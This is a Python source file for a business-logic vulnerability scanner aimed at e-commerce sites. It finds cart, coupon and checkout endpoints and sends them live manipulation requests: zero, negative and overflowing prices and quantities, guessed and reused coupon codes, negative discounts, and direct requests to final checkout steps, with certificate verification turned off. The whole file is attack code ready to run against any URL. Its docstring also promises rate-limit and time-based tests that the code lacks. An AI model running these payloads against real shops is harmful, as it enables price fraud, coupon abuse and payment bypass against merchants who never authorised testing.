#!/usr/bin/env python3
"""
business_logic.py — Business Logic Vulnerability Tester

Tests for:
1. Price manipulation (negative values, 0.01 prices, float overflow)
2. Coupon/promo abuse (reuse, stacking, negative discounts)
3. Quantity manipulation (negative, MAX_INT, float)
4. Workflow bypass (skip steps, direct access to final step)
5. Rate limiting on sensitive actions
6. Time-based manipulation (expired offers)

Usage:
    from business_logic import BusinessLogicTester
    tester = BusinessLogicTester("https://target.com")
    result = tester.test_all()
"""
import json, os, re, time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    requests = None

PRICE_PAYLOADS = [
    0, -1, -0.01, 0.001, 0.01, 0.0001,
    -999999, 99999999999, 1e308,
    "0", "-1", "0.0001", "NaN", "Infinity", "-Infinity",
    None, "", "null", "undefined",
]

QUANTITY_PAYLOADS = [
    0, -1, -100, 999999999, 2147483647, 2147483648,
    -2147483648, 0.5, -0.5, 1.5,
    "0", "-1", "999999999", "NaN",
]


class BusinessLogicTester:
    def __init__(self, base_url: str = ""):
        self.base_url = base_url.rstrip("/")
        self.findings = []
        self.session = requests.Session() if requests else None
        if self.session:
            self.session.verify = False
            import urllib3; urllib3.disable_warnings()

    def find_endpoints(self, headers: dict = None) -> dict:
        """Discover cart/payment/checkout endpoints."""
        headers = headers or {}
        found = {"cart": [], "checkout": [], "payment": [],
                 "coupon": [], "order": []}

        paths = {
            "cart": ["/cart", "/api/cart", "/basket", "/bag",
                    "/api/v1/cart", "/shopping-cart"],
            "checkout": ["/checkout", "/api/checkout", "/order",
                        "/api/v1/checkout", "/purchase"],
            "payment": ["/payment", "/api/payment", "/pay",
                       "/api/v1/payment", "/billing"],
            "coupon": ["/coupon", "/api/coupon", "/promo",
                      "/discount", "/api/v1/coupon", "/api/v1/promo",
                      "/api/apply-coupon", "/api/discount"],
            "order": ["/order", "/api/orders", "/api/v1/orders",
                     "/order/create", "/api/order/submit"],
        }

        for category, path_list in paths.items():
            for path in path_list:
                url = f"{self.base_url}{path}"
                try:
                    resp = self.session.get(url, headers=headers, timeout=5)
                    if resp.status_code in (200, 401, 403, 405):
                        found[category].append({
                            "url": url, "status": resp.status_code})
                except Exception:
                    continue

        return found

    def test_price_manipulation(self, cart_url: str,
                                headers: dict = None) -> dict:
        """Test if price can be manipulated via API."""
        headers = headers or {}
        result = {"type": "PRICE_MANIPULATION", "vulnerable": False, "tests": []}

        for price in PRICE_PAYLOADS:
            payloads = [
                {"price": price},
                {"amount": price},
                {"total": price},
                {"unit_price": price},
            ]
            for data in payloads:
                try:
                    # Try PUT/PATCH to modify price
                    for method in ["PUT", "PATCH", "POST"]:
                        resp = self.session.request(
                            method, cart_url,
                            json=data, headers={**headers,
                                "Content-Type": "application/json"},
                            timeout=8)

                        if resp.status_code in (200, 201):
                            test = {"payload": str(data)[:80],
                                   "method": method,
                                   "status": resp.status_code}

                            try:
                                body = resp.json()
                                resp_price = (body.get("price") or
                                            body.get("total") or
                                            body.get("amount"))
                                if resp_price is not None:
                                    test["response_price"] = resp_price
                                    if isinstance(resp_price, (int, float)):
                                        if resp_price < 0 or resp_price == 0:
                                            test["severity"] = "CRITICAL"
                                            result["vulnerable"] = True
                                            self.findings.append({
                                                "type": "PRICE_MANIPULATION",
                                                "url": cart_url, **test})
                            except Exception:
                                pass

                            result["tests"].append(test)
                except Exception:
                    continue
                time.sleep(0.2)

        return result

    def test_quantity_manipulation(self, cart_url: str,
                                   headers: dict = None) -> dict:
        """Test negative/overflow quantities."""
        headers = headers or {}
        result = {"type": "QUANTITY_MANIPULATION", "vulnerable": False, "tests": []}

        for qty in QUANTITY_PAYLOADS:
            data = {"quantity": qty}
            try:
                resp = self.session.post(cart_url, json=data,
                    headers={**headers, "Content-Type": "application/json"},
                    timeout=8)

                if resp.status_code in (200, 201):
                    test = {"quantity": str(qty), "status": resp.status_code}
                    try:
                        body = resp.json()
                        total = body.get("total") or body.get("subtotal")
                        if total is not None and isinstance(total, (int, float)):
                            if total < 0:
                                test["negative_total"] = total
                                test["severity"] = "CRITICAL"
                                result["vulnerable"] = True
                                self.findings.append({
                                    "type": "QUANTITY_MANIPULATION",
                                    "url": cart_url, **test})
                    except Exception:
                        pass
                    result["tests"].append(test)
            except Exception:
                continue
            time.sleep(0.2)

        return result

    def test_coupon_abuse(self, coupon_url: str,
                          headers: dict = None) -> dict:
        """Test coupon reuse and stacking."""
        headers = headers or {}
        result = {"type": "COUPON_ABUSE", "vulnerable": False, "tests": []}

        test_codes = ["TEST", "DISCOUNT", "PROMO", "SALE",
                     "FREESHIP", "10OFF", "20OFF", "50OFF"]

        for code in test_codes:
            try:
                resp = self.session.post(
                    coupon_url,
                    json={"code": code, "coupon": code, "promo": code},
                    headers={**headers, "Content-Type": "application/json"},
                    timeout=8)

                if resp.status_code == 200:
                    # Try applying same code twice (reuse)
                    resp2 = self.session.post(
                        coupon_url,
                        json={"code": code, "coupon": code, "promo": code},
                        headers={**headers, "Content-Type": "application/json"},
                        timeout=8)

                    if resp2.status_code == 200:
                        result["tests"].append({
                            "code": code, "reuse_accepted": True,
                            "note": "Coupon stacking/reuse possible"})

            except Exception:
                continue

        # Test negative discount
        for val in [-100, -50, -999]:
            try:
                resp = self.session.post(
                    coupon_url,
                    json={"discount": val, "amount": val},
                    headers={**headers, "Content-Type": "application/json"},
                    timeout=8)
                if resp.status_code == 200:
                    result["tests"].append({
                        "discount": val, "accepted": True,
                        "severity": "HIGH"})
                    result["vulnerable"] = True
                    self.findings.append({
                        "type": "NEGATIVE_DISCOUNT",
                        "url": coupon_url, "value": val, "severity": "HIGH"})
            except Exception:
                continue

        return result

    def test_workflow_bypass(self, headers: dict = None) -> dict:
        """Test if checkout steps can be skipped."""
        headers = headers or {}
        result = {"type": "WORKFLOW_BYPASS", "vulnerable": False, "tests": []}

        # Try accessing later steps directly
        final_steps = [
            "/checkout/confirm", "/checkout/complete", "/order/confirm",
            "/payment/process", "/checkout/step-3", "/checkout/review",
            "/api/order/complete", "/api/checkout/finalize",
        ]

        for path in final_steps:
            url = f"{self.base_url}{path}"
            try:
                for method_fn in [self.session.get, self.session.post]:
                    resp = method_fn(url, headers=headers, timeout=5)
                    if resp.status_code == 200:
                        # Check if it shows order confirmation page
                        if any(k in resp.text.lower() for k in
                               ("order confirmed", "thank you", "success",
                                "confirmation", "receipt")):
                            result["vulnerable"] = True
                            result["tests"].append({
                                "url": url, "severity": "HIGH",
                                "note": "Direct access to final checkout step"})
                            self.findings.append({
                                "type": "WORKFLOW_BYPASS",
                                "url": url, "severity": "HIGH"})
            except Exception:
                continue

        return result

    def test_all(self, headers: dict = None) -> dict:
        headers = headers or {}
        endpoints = self.find_endpoints(headers)
        results = {"endpoints": endpoints, "total_findings": 0}

        if endpoints["cart"]:
            url = endpoints["cart"][0]["url"]
            results["price"] = self.test_price_manipulation(url, headers)
            results["quantity"] = self.test_quantity_manipulation(url, headers)

        if endpoints["coupon"]:
            url = endpoints["coupon"][0]["url"]
            results["coupon"] = self.test_coupon_abuse(url, headers)

        results["workflow"] = self.test_workflow_bypass(headers)
        results["total_findings"] = len(self.findings)
        return results

    def save_findings(self, target: str) -> None:
        out = Path(f"findings/{target}/business_logic")
        out.mkdir(parents=True, exist_ok=True)
        if self.findings:
            (out / f"bizlogic_{int(time.time())}.json").write_text(
                json.dumps(self.findings, indent=2, default=str))
